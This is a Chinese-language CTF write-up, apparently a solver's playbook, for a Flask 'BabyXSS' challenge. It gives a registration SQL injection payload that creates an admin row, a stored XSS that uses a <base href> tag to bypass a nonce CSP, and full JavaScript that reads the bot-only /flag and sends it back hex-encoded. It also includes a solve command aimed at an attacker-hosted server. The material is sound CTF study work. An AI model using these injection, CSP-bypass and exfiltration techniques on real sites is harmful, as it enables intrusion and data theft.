# BabyXSS（初赛 WEB-04 · Web · 200 分 · 需现场靶机）

Flask + SQLite 个人主页站，`/report/<id>` 用 pyppeteer 起真 Chromium 访问对应 profile。
flag 机制：`GET /flag` 只对 `remote_addr` 含 `127.0.0.1` 返回（即只有 bot 的浏览器读得到），
所以必须打存储型 XSS 让 bot 代读后**站内回传**。

三道闸（附件源码审计 + 容器内 pyppeteer 全链复现通过）：

1. **渲染闸**：`profile.html` 只有 `username == 'admin'` 才 `{{ bio|safe }}`，注册黑名单
   （admin/root/guest + SELECT/UPDATE/DELETE/INSERT）却禁了 'admin' 字样 → 用注册处
   f-string SQL 注入 + `char(97,100,109,105,110)` 拼出 admin 行。
2. **注册闸**：`if not is_valid_input(...) or form.validate(): 拒绝` —— 表单**合法反而被拒**，
   必须让 validate() 为 False（如 1 字符密码，长度校验失败）才走 INSERT，且值不经参数化直接拼接。
3. **CSP 闸**：flask_talisman 实测发出 `script-src 'nonce-<每次随机>'; object-src 'none'; style-src 'self'; default-src * data: unsafe-inline`。
   存储 payload 是静态的，永远不知道当次 nonce → 内联 script/onerror 全废。**唯一缺口**：
   页面自带的 `<script src=".../jquery-3.6.0.min.js" nonce="...">`，用 `<base href>` 改写其
   src（base-uri 未限制；nonce 在标签上 → 换源照样放行）。JS 托管在我们自己起的 LAN HTTP 服务上。

## 现场流程（对决赛靶机 URL 执行）

```bash
cd /tmp && WORK=/opt/solver/knowledges/xihulunjian/challenges/BabyXSS/exp
# 0) 前置：确认靶机容器能反连 solver 容器（同 docker 网络/互 ping），记下 solver IP
python3 $WORK/solve.py --target http://TARGET:PORT --host <SOLVER_IP> --port 9000
```

exp 单发完成：SQLi 注入锚点行+admin 行（bio=`</p><base href="http://SOLVER:9000/">`）→
登录锚点行定位 admin id（=锚点 id+1）→ 在 :9000 托管 exfil JS（**路径必须是**
`/static/jquery-3.6.0.min.js`，base 只换源不换路径）→ `GET /report/<admin_id>`（阻塞至 bot
关浏览器）→ 登录回传用户（固定用户名 exfXXXXXX / 密码 abc）→ 302 到 /profile/<id> 读
hex bio → 解码出 flag。全链本地复现输出：`[FLAG] DASCTF{...}`。

exfil JS 原文（JS 托管在我们服务器上，不占 bio 500 字符、不受黑名单检查）：

```js
fetch('http://127.0.0.1:8080/flag').then(r=>r.text()).then(t=>{
  var h=t.split('').map(c=>c.charCodeAt(0).toString(16)).join('-');
  fetch('http://127.0.0.1:8080/register',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'username=exfXXXXXX&password=abc&bio='+encodeURIComponent(h)});
});
```

注意 JS 里用**绝对地址** `http://127.0.0.1:8080`（bot 与 app 同机，bot.py 就访问这个），
因为 `<base>` 生效后相对路径都会解析到我们的 JS 服务器。flag 编成 hex 是为了过
is_valid_input 黑名单（纯 `0-9a-f-` 拼不出 admin/root/guest/SELECT…）；密码 `abc`（<6 位）
让 `form.validate()` 为 False，INSERT 照常落库。

## 原理（备查）

- 注册：`INSERT ... VALUES ('{username}', '{password}', '{bio}')` 纯 f-string 拼接；
  bio 注入 `x'), (char(97,100,109,105,110), 'p', '<PAYLOAD>') -- ` 一次插两行，
  第二行 username='admin'（黑名单查的是**原始输入串**，char() 不含字面 admin）。
  sqlite3 execute() 只允许单语句，所以只能 INSERT，不能 UPDATE/ stacked queries。
- profile 页 bio 渲染：`{% if username == 'admin' %}{{ bio|safe }}{% else %}{{ bio }}{% endif %}`。
- CSP（本地 flask-talisman 1.1.0 复现实测）：`script-src  'nonce-XXX'`（源码里
  `'script-src': ''` 被 flask_talisman 追加 nonce 后变成仅 nonce）；`default-src * data: unsafe-inline`
  中 unsafe-inline 是**裸 token**（作者少写引号）→ 按主机名解析，等于没有，但 script-src
  存在即完全接管脚本策略。所有响应带 `X-Content-Type-Options: nosniff` → 同源
  text/html 页面无法当 script src 用（否则可用 admin profile 当 JS 文件）。
- base-tag 绕过是经典 nonce-CSP 技法（LoRexxar 2017 同源思路的离线版）：nonce 校验的
  是**元素属性**而非 URL，带正确 nonce 的 script 标签从任何源加载都放行。
- bot（bot.py，与 app 同机 `os.system` 启动）：`goto → asyncio.sleep(3) → close`，
  3 秒窗口，LAN 上拉 JS+fetch+POST 绰绰有余；Flask dev server threaded=True，
  /report 阻塞不影响并发请求（注入回传行就在 bot 浏览期间完成）。
- /login 无任何校验、参数化查询：任意次登录用于定位行 id（302 的 Location 含 /profile/<id>）。

## 失败分支

- `[1] sqli register -> fail`（用户注册失败）：username='admin' 有 UNIQUE 约束——若场上
  admin 行已被别人注入，无法覆盖（无 UPDATE 通道），且别人的 admin bio 不是我们的
  payload → 尽早起手；真撞了就换题并回报调度者。
- `[5] no exfil row`：靶机容器反连不到 solver（网络隔离）——换同网络接口/把 JS 宿主
  挪到靶机可达的任意主机再试；确认不通则本路线失效，如实回报。
- `/report` 超时：os.system 串行起整个 Chromium，首启可到十几秒，timeout 拉到 90s+。
- flash「含有非法关键字」：payload 串里混入了黑名单词（按本模板写不会）。
- 拿到 hex 但解码乱码：flag 含换行（/flag 文件尾 \\n）属正常，strip 即可。

## 决赛实测备忘

- 初赛全场未解；本路线完全基于附件源码（两层解压：BabyXSS的附件.zip → tempdir/WEB附件/
  src-file.zip → src/）+ 容器内 pyppeteer（chromium 1181205）**端到端复现打通**（假 flag 验证）。
- 动态 flag，无离线答案。唯一环境依赖是「靶机容器 → solver 容器」反向可达；
  现场先花 1 分钟验证（靶机上 curl solver:9000 或直接看 docker 网络）。
- 决赛若靶机把 app 暴露在非常规端口/路径，--app-origin 仍应是 **bot 视角**的
  `http://127.0.0.1:8080`（bot.py 硬编码），别照抄外部 URL。
